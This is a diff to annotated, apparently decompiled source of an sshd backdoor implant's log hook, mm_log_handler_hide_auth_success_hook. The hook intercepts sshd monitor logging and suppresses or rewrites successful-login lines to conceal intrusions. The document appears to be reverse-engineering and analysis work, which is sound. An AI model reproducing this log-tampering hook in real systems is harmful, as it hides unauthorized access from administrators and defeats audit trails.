@@ -6,7 +6,7 @@
 
 /*
  * AutoDoc: Hooks sshd's mm_log_handler so every monitor log line flows through the implant before touching syslog. It refuses
- * requests once logging was already squelched, when the loader flipped `global_ctx->disable_backdoor`, or when setup failed to
+ * requests once logging was already squelched, when the captured caller uid is non-zero (non-root), or when setup failed to
  * capture a valid handler/context pair, falling back to sshd's original handler. If a message already contains the literal
  * `"Connection closed by ... (preauth)"` it replays the line via `sshd_log_via_sshlogv(log_ctx_state, level, "%s", msg)` after forcing
  * syslog into mask `SYSLOG_MASK_ALL` so sshd stays quiet. When the text instead begins with `Accepted {password|publickey} for` the hook
@@ -64,8 +64,8 @@ void mm_log_handler_hide_auth_success_hook(LogLevel level,int forced,char *msg,v
   uchar closing_bracket_char;
   
   zero_seed = 0;
-  log_ctx_state = *(sshd_log_ctx_t **)(global_ctx + 0x30);
-  libc_imports = *(long *)(global_ctx + 0x10);
+  log_ctx_state = global_ctx->sshd_log_ctx;
+  libc_imports = global_ctx->libc_imports;
   filtered_host_chunk0 = 0;
   filtered_host_chunk1 = 0;
   word_cursor = filtered_host_words;
@@ -92,8 +92,8 @@ void mm_log_handler_hide_auth_success_hook(LogLevel level,int forced,char *msg,v
     if (log_ctx_state->log_squelched == TRUE) {
       return;
     }
-    // AutoDoc: Stop filtering altogether once the loader flagged logging as disabled (for example after sshd drops back to the sandbox).
-    if (*(int *)(global_ctx + 0x90) != 0) {
+    // AutoDoc: Skip filtering when the captured caller uid is non-zero (non-root).
+    if (global_ctx->caller_uid != 0) {
       return;
     }
     // AutoDoc: Treat a saved handler without a saved context value as an incomplete log-hook install and bail out immediately.
